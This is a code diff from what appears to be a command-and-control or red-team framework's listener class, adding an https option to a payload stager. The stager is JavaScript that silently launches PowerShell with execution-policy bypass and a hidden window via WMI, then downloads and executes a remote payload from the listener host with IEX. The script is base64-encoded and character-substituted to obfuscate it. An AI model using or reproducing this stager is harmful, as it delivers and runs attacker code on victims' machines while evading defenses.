@@ -38,6 +38,7 @@ class NewListener:
         self.host = args[3]
         self.interval = args[4]
         self.path = args[5]
+
     elif len(args) == 8:
 
         self.name = args[0]
@@ -154,13 +155,20 @@ eval(bas(es));
 </html>
 '''
       js = '''
-var cm="powershell -exec bypass -w 1 -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($V.downloadstring('http://{ip}:{port}/{payload}'));";
+var cm="powershell -exec bypass -w 1 -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($V.downloadstring('{protocol}://{ip}:{port}/{payload}'));";
 var w32ps= GetObject('winmgmts:').Get('Win32_ProcessStartup');
 w32ps.SpawnInstance_();
 w32ps.ShowWindow=0;
 var rtrnCode=GetObject('winmgmts:').Get('Win32_Process').Create(cm,'c:\\\\',w32ps,null);
 '''
-      js = js.replace('{ip}',self.host).replace('{port}',str(self.bindport)).replace('{payload}',self.path)
+
+
+      if self.ssl:
+          protocol = "https"
+      else:
+          protocol = "http"
+
+      js = js.replace('{ip}',self.host).replace('{port}',str(self.bindport)).replace('{payload}',self.path).replace("{protocol}", protocol)
       #print  js
       js = base64.b64encode(js.encode()).decode() #js.encode('base64').replace('\n', '')
       re = [[']','='],['[','a'],[',','b'],['@','D'],['-','x'],['~','N'],['*','E'],['%','C'],['$','H'],['!','G'],['{','K'],['}','O']]
